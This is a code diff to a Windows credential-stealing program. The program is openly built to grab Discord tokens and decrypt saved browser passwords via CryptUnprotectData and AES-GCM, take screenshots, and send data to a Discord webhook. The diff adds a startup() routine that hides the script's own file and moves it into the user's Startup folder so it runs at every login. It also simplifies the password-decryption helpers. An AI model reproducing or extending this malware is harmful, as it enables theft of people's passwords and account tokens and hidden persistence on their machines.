@@ -7,7 +7,7 @@ from base64 import b64decode
 from json import load, loads
 from platform import platform
 from re import findall, match
-from shutil import copy2
+from shutil import copy2, move as movefile
 from sqlite3 import connect
 from subprocess import PIPE, Popen
 from threading import Thread
@@ -21,6 +21,8 @@ from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
+from win32api import SetFileAttributes
+from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
 WEBHOOK_URL = "&WEBHOOK_URL&"
@@ -66,7 +68,7 @@ def pegasus():
 
     for func in {main(WEBHOOK_URL), 
     cleanup(),
-    inject(WEBHOOK_URL),}:
+    startup(),}:
         try:
             func()
         except:
@@ -186,18 +188,12 @@ class grabtokens():
         except Exception:
             pass
     
-    def decrypt_payload(self, cipher, payload):
-        return cipher.decrypt(payload)
-    
-    def generate_cipher(self, aes_key, iv):
-        return AES.new(aes_key, AES.MODE_GCM, iv)
-    
     def decrypt_password(self, buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
-            cipher = self.generate_cipher(master_key, iv)
-            decrypted_pass = self.decrypt_payload(cipher, payload)
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception:
@@ -343,18 +339,12 @@ class password():
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
     
-    def decrypt_payload(self, cipher, payload):
-        return cipher.decrypt(payload)
-
-    def generate_cipher(self, aes_key, iv):
-        return AES.new(aes_key, AES.MODE_GCM, iv)
-    
     def decrypt_password(self, buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
-            cipher = self.generate_cipher(master_key, iv)
-            decrypted_pass = self.decrypt_payload(cipher, payload)
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except:
@@ -522,7 +512,15 @@ class debug:
     def self_destruct(self):
         os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__)))
         exit()
-                           
+
+def startup():
+    cwf = r"{}\{}".format(os.getcwd(), os.path.basename(__file__))
+    startup = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{}".format(os.getlogin(), os.path.basename(__file__))
+
+    if not cwf == startup:
+        SetFileAttributes(cwf, FILE_ATTRIBUTE_HIDDEN)
+        movefile(cwf, startup)   
+                            
 if __name__ == '__main__':
     if os.name != "nt":
         exit()
